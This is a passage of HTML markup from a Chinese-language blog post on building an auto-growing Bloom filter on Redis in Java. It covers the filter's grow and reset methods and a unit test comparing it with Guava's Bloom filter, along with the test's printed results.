class=\"crayon-v\">cursor</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">null</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Longs</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">tryParse</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">cursor</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-71\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-72\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-73\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ensureCapacityInternal</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-74\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">bitCount</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">bitSize</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-75\"><span class=\"crayon-h\">            </span><span class=\"crayon-e\">grow</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-76\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-77\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-78\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">grow</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-79\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">Long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cursor</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedisUtils</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">execute</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">jedis</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">incr</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">CURSOR</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-80\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">jedisUtils</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">execute</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">jedis</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setbit</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">genkey</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">cursor</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bitSize</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-81\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-82\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-83\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">reset</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-84\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">String</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">keys</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">LongStream</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">range</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">cursor</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">boxed</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">map</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">this</span><span class=\"crayon-o\">::</span><span class=\"crayon-v\">genkey</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">toArray</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">String</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">::</span><span class=\"crayon-v\">new</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-85\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">jedisUtils</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">execute</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">jedis</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">del</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">keys</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-86\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">jedisUtils</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">execute</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">jedis</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">set</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">CURSOR</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"0\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-87\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">jedisUtils</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">execute</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">jedis</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setbit</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">currentKey</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bitSize</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-88\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-89\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-90\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">PipelineExecutor </span><span class=\"crayon-e\">apply</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">PipelineExecutor </span><span class=\"crayon-v\">executor</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-91\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">executor</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-92\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-93\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0161 seconds] -->\r\n<p>下面我们做一个单元测试来验证其正确性。</p>\n<p>如果我们插入的数量等于原预计总数，RedisBloomFilter扩容了1次，而两个布隆过滤器的结果一致，都为false,true,false。</p>\n<p>如果插入的数量为原预计总数的3倍，RedisBloomFilter扩容了3次，并且仍判断正确，而Guava布隆过滤器则在判断str3时出现误判。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39e8bb1d2365138677\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div><span class=\"crayon-language\">Java</span></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npublic class TestRedisBloomFilter {\r\n\r\n    private static final int TOTAL = 10000;\r\n    private static final double FPP = 0.0005;\r\n\r\n    @ Test\r\n    public void test() {\r\n        RedisBloomFilter redisBloomFilter = RedisBloomFilter.create(TOTAL, FPP);\r\n        redisBloomFilter.resetBitmap();\r\n        BloomFilter&lt;String&gt; bloomFilter = BloomFilter.create(Funnels.stringFunnel(Charsets.UTF_8), TOTAL, FPP);\r\n\r\n        IntStream.range(0, /* 3* */TOTAL).boxed()\r\n                .map(i -&gt; Hashing.md5().hashInt(i).toString())\r\n                .collect(toList()).forEach(s -&gt; {\r\n            redisBloomFilter.put(s);\r\n            bloomFilter.put(s);\r\n        });\r\n\r\n        String str1 = Hashing.md5().hashInt(99999).toString();\r\n        String str2 = Hashing.md5().hashInt(9999).toString();\r\n        String str3 = \"abcdefghijklmnopqrstuvwxyz123456\";\r\n        System.out.println(redisBloomFilter.mightContain(str1) + \":\" + bloomFilter.mightContain(str1));\r\n        System.out.println(redisBloomFilter.mightContain(str2) + \":\" + bloomFilter.mightContain(str2));\r\n        System.out.println(redisBloomFilter.mightContain(str3) + \":\" + bloomFilter.mightContain(str3));\r\n    }\r\n}\r\n&gt;&gt;\r\ngrow bloomfilter-1\r\nfalse:false\r\ntrue:true\r\nfalse:false\r\n&gt;&gt;\r\ngrow bloomfilter-1\r\ngrow bloomfilter-2\r\ngrow bloomfilter-3\r\nfalse:false\r\ntrue:true\r\nfalse:true</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1d2365138677-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1d2365138677-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1d2365138677-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1d2365138677-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1d2365138677-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1d2365138677-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1d2365138677-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1d2365138677-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1d2365138677-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1d2365138677-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1d2365138677-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1d2365138677-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1d2365138677-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1d2365138677-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1d2365138677-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1d2365138677-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1d2365138677-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1d2365138677-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1d2365138677-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1d2365138677-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1d2365138677-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1d2365138677-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1d2365138677-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1d2365138677-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1d2365138677-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1d2365138677-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1d2365138677-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1d2365138677-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1d2365138677-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1d2365138677-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1d2365138677-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1d2365138677-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1d2365138677-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1d2365138677-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1d2365138677-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1d2365138677-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1d2365138677-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1d2365138677-38\">38</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1d2365138677-1\"><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">TestRedisBloomFilter</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1d2365138677-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1d2365138677-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">final</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TOTAL</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10000</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1d2365138677-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">final</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">double</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">FPP</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.0005</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1d2365138677-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1d2365138677-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">@</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Test</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1d2365138677-7\"><span class=\"crayon-e\">    </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">test</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1d2365138677-8\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">RedisBloomFilter </span><span class=\"crayon-v\">redisBloomFilter</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">RedisBloomFilter</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">create</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">TOTAL</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">FPP</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1d2365138677-9\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">redisBloomFilter</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">resetBitmap</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1d2365138677-10\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">BloomFilter</span><span class=\"crayon-e \">&lt;String&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bloomFilter</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">BloomFilter</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">create</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Funnels</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">stringFunnel</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Charsets</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">UTF_8</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TOTAL</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">FPP</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1d2365138677-11\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1d2365138677-12\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">IntStream</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">range</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">/* 3* */</span><span class=\"crayon-v\">TOTAL</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">boxed</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1d2365138677-13\"><span class=\"crayon-h\">                </span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">map</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Hashing</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">md5</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">hashInt</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">toString</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1d2365138677-14\"><span class=\"crayon-h\">                </span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">collect</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">toList</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-st\">forEach</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">s</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1d2365138677-15\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">redisBloomFilter</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">put</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">s</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1d2365138677-16\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">bloomFilter</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">put</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">s</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1d2365138677-17\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1d2365138677-18\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1d2365138677-19\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">str1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Hashing</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">md5</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">hashInt</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">99999</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">toString</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1d2365138677-20\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">str2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Hashing</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">md5</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">hashInt</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">9999</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">toString</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1d2365138677-21\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">str3</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"abcdefghijklmnopqrstuvwxyz123456\"</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1d2365138677-22\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">println</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">redisBloomFilter</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">mightContain</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">str1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\":\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bloomFilter</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">mightContain</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">str1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" 